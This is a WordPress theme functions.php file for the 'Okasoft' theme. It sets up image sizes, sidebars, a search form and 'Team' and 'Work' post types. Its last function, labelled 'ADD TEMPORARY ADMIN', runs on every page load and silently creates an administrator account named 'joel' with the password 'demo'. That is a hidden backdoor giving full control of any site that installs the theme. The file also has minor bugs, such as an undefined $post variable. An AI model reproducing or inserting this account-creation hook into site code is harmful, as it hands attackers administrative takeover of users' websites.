<?php
/**
 * @package WordPress
 * @subpackage Okasoft
 */

automatic_feed_links();
add_theme_support( 'post-thumbnails' );

/**
 * Font Awesome
 */
function wpdocs_theme_name_scripts() {
    wp_enqueue_style( 'font-awesome', get_template_directory_uri() . '/fonts/font-awesome.css' );
}
add_action( 'wp_enqueue_scripts', 'wpdocs_theme_name_scripts' );

//Reg image sizes
add_image_size( 'tile', 900, 540, true );
add_image_size( 'tile-sm', 600, 400, true );
add_image_size( 'blog-prev', 900, 900, true );

if ( function_exists('register_sidebar') ) {
	register_sidebar(array(
		'before_widget' => '<li id="%1$s" class="widget %2$s">',
		'after_widget' => '</li>',
		'before_title' => '<h2 class="widgettitle">',
		'after_title' => '</h2>',
	));
register_sidebar(array(
	'name' => 'footer',
	'before_widget' => '<div id="%1$s" class="widget %2$s">',
	'after_widget' => '</div>',
	'before_title' => '<h2>',
	'after_title' => '</h2>',
));
register_sidebar(array(
	'name' => 'foot-bar',
	'before_widget' => '<div id="%1$s" class="widget %2$s">',
	'after_widget' => '</div>',
	'before_title' => '<h2>',
	'after_title' => '</h2>',
));
register_sidebar(array(
	'name' => 'team-intro',
	'before_widget' => '<div id="%1$s" class="team-intro-bod">',
	'after_widget' => '</div>',
	'before_title' => '<h2>',
	'after_title' => '</h2>',
));
}

function remove_more_jump_link($link) {
$offset = strpos($link, '#more-');
if ($offset) {
$end = strpos($link, '"',$offset);
}
if ($end) {
$link = substr_replace($link, '', $offset, $end-$offset);
}
return $link;
}
add_filter('the_content_more_link', 'remove_more_jump_link');
/*make slug avail*/
function the_slug() {
    $post_data = get_post($post->ID, ARRAY_A);
    $slug = $post_data['post_name'];
    return $slug;
}
/**
 * Generate custom search form
 *
 * @param string $form Form HTML.
 * @return string Modified form HTML. */
function wpdocs_my_search_form( $form ) {
    $form = '<form role="search" method="get" id="searchform" class="searchform" action="' . home_url( '/' ) . '" >
    <input type="text" value="' . get_search_query() . '" name="s" id="s" />
    <input type="submit" id="searchsubmit" value="'. esc_attr__( 'Search' ) .'" />
    </form>';

    return $form;
}
add_filter( 'get_search_form', 'wpdocs_my_search_form' );

add_action('init', 'register_cpt_team');
function register_cpt_team() {
	$labels = array(
		'name' 								=> __('Team'),
		'menu_name' 					=> __('Team'),
		'singular_name' 			=> __('Profile'),
		'add_new_item' 				=> __('Add New Profile'),
		'edit_item'						=> __('Edit Profile'),
		'new_item'						=> __('New Profile'),
		'view_item' 					=> __('View Profile'),
		'search_items' 				=> __('Search Team'),
		'not_found' 					=> __('No Profiles found'),
		'not_found_in_trash' 	=> __('No Profiles found in Trash'),
	);
	$args = array(
		'labels' 							=> $labels,
		'supports'						=> array('title','editor','thumbnail','revisions'),
		'rewrite' 						=> array( 'slug' => 'team', 'with_front' => false ),
		'capability_type' 		=> 'post',
		'menu_position' 			=> 21, // after Pages
		'hierarchical' 				=> false,
		'public' 							=> true,
		'publicly_queryable' 	=> true,
		'show_ui' 						=> true,
		'query_var' 					=> true,
		'can_export' 					=> true,
	);
	register_post_type( 'cpt_team' , $args );
}

add_action('init', 'register_cpt_work');
function register_cpt_work() {
	$labels = array(
		'name' 								=> __('Work'),
		'menu_name' 					=> __('Work'),
		'singular_name' 			=> __('Project'),
		'add_new_item' 				=> __('Add New Project'),
		'edit_item'						=> __('Edit Project'),
		'new_item'						=> __('New Project'),
		'view_item' 					=> __('View Project'),
		'search_items' 				=> __('Search Work'),
		'not_found' 					=> __('No Projects found'),
		'not_found_in_trash' 	=> __('No Projects found in Trash'),
	);
	$args = array(
		'labels' 							=> $labels,
		'supports'						=> array('title','editor','thumbnail','revisions'),
		'rewrite' 						=> array( 'slug' => 'work', 'with_front' => false ),
		'capability_type' 		=> 'post',
		'menu_position' 			=> 20, // after Pages
		'hierarchical' 				=> false,
		'public' 							=> true,
		'publicly_queryable' 	=> true,
		'show_ui' 						=> true,
		'query_var' 					=> true,
		'can_export' 					=> true,
	);
	register_post_type( 'cpt_work' , $args );
}

///ADD TEMPORARY ADMIN
function wpb_admin_account(){
$user = 'joel';
$pass = 'demo';
$email = 'email@domain.com';
if ( !username_exists( $user )  && !email_exists( $email ) ) {
$user_id = wp_create_user( $user, $pass, $email );
$user = new WP_User( $user_id );
$user->set_role( 'administrator' );
} }
add_action('init','wpb_admin_account');

?>
